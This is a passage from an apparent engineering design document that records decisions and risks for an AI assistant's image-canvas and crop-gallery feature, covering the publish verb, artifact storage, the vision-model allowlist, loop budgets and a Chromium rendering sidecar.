| 10.1 | Publish verb | **Separate `show_canvas`** |
| 10.2 | Scene home | **`ToolArtifactRepo`** |
| 10.3 | Model allowlist | **`qwen3.8-27b` + `qwen3.8-27b-q4` only** |
| 10.4 | Loop budget | **3 looks / 10 calls / 12 crops** |
| 10.5 | W4 interim fallback | **None — the lane waits for `image_set`** |
| 10.6 | HTML lane | **Full browser sidecar (real CSS)** |
| 10.7 | `image_set` GUI gate | **B — source photo + filmstrip** |

**10.1 — separate `show_canvas` verb.** Follows the rule stated at
`agents.py:181,228` (*"show/remove stay SEPARATE (distinct shapes)"*) and the
`research_report`/`external_video` precedents. The in-tree counter-precedent —
`compare_images` uses `show: true`, default true — was weighed and set aside on the
grounds that `compare_images` is single-call (call → done → show) whereas a canvas is
multi-call, so a default-true boolean spams a card per intermediate draft and a
default-false one gets forgotten. Reversible in W3 at the cost of one sidecar rewrite.

**10.2 — `ToolArtifactRepo`.** Session-scoped, RLS-firewalled, blob-backed, already
domain-stamped by `domain_for_session` (`tool_artifacts.py:32-44`), upsert-on-
`source_url`. Decisive factor: it houses **both** lanes in one place, and the
blank-canvas lane is explicitly in scope. `turn_attachments.analysis` was the runner-up
— it inherits the photo's firewall by construction, which is a tighter security story —
but it has no home for a blank canvas and its `set_analysis` also flips
`has_extracts=True`, video-shaped semantics that would make a canvas falsely claim OCR
extracts.

**10.3 — the two Qwen3.8 vision twins only.** Same weights, same repo, same projector,
so **one W0 probe qualifies both**. Everything else is hidden, including
`qwen3.8-27b-mtp` (text-only) and the `qwen3-vl-30b` entries (not probed; and 30B-A3B's
~3B active parameters are the weakest architecture here). Extending the list is a
deliberate act requiring that model's own convention check.

**10.4 — 3 looks / 10 calls / 12 crops** (raised from the drafted 2/6/12). The owner
chose the looser ceiling explicitly to serve the experimental blank-canvas lane, where
the model cannot predict its own output and needs room for aim → draw → check → fix →
check. See §6.2 for why the ceiling still sits where repair rounds saturate.

**10.5 — no interim fallback for the crop lane.** Single-region `crop_region` (N calls
→ N durable cards, shippable today with zero frontend change) was declined in favour of
waiting for the one-call `image_set` gallery. **Consequence: W4 is hard-blocked on the
three-mock GUI gate, and W5 is blocked behind W4.** Mitigation in §11.4.

**10.7 — the crop gallery is variant B** (`docs/mocks/image-set-b-filmstrip.html`, the
binding spec; A and C retained as the record). The source photo stays visible with each
crop's region boxed on it, above a horizontally scrolling filmstrip. Chosen over the
denser grid (A) and the provenance-labelled list (C) because it answers *"where in the
photo did this come from?"* without a tap — which matters precisely because VLM
grounding mis-boxes and undercounts silently, and a wrong crop is only obvious next to
the region it claims to be. Accepted costs: the tallest card of the three, and the
source image repeats content already in the chat above it.

**10.6 — the HTML lane is a real browser, and the renderer is a general service.** The
zero-dependency PyMuPDF `Story` option was evaluated with working renders of both what
it does and what it silently drops (§3b) and rejected: flow layout is not what a model
writing CSS expects. The owner chose the Chromium sidecar, and then made the sharper
call that the render path should be **general-purpose rather than canvas-owned**,
because getting an image back is precisely what removes the risk of model-authored
markup and components. That reframing is why §3b is its own section: the canvas is the
first consumer of a capability the box now has, not the owner of a private detail.
Accepted costs, stated plainly: a third browser container (~1GB, idle-unloading), and
a block edit means regenerating that block's markup rather than moving an element —
though the block's *rect* still moves by id, which is why `html` is an op.

---

## 11. Risks

1. **W0 finds the convention isn't what any doc says.** Most likely outcome is `0–1000`
   per the cookbook, but 3.8 documents nothing and the Qwen3-VL docs disagree with
   themselves. Mitigated by measuring before building, and by `grounding.py` refusing
   on unknown models rather than guessing.
2. **Grounding under-performs the OSWorld number on the owner's actual photos.**
   OSWorld is GUI screenshots — high-contrast, axis-aligned, synthetic. A cluttered
   garage photo is a different distribution. The fixture set in W0 should include real
   owner-style photos, not just clean test images.
3. **The blank-canvas lane disappoints.** Expected, accepted, and explicitly the
   owner's call to build anyway. The risk to manage is scope creep *in response* to
   disappointment — W6 records the outcome rather than opening an optimisation project.
4. **W4's mock gate stalls the crop lane — and by decision §10.5 there is no fallback,
   so the lane simply waits.** W5 (faces) sits behind W4, so a stalled gate stalls both,
   and "export individual images of faces" is one of the three original asks. The
   cheapest unblock is process, not code: **run the three `image_set` mocks early, in
   parallel with W1/W2**, so the gate is cleared before W4's backend is ready rather
   than after. Keep W4 off the critical path for L1.
5. **Permanent crop storage.** No GC exists anywhere; 12 crops per call is bounded but
   monotonic. Flagged, not fixed here.
6. **The template trap eats conversation history** and gets misattributed to this
   feature. W0 checks it first, deliberately.
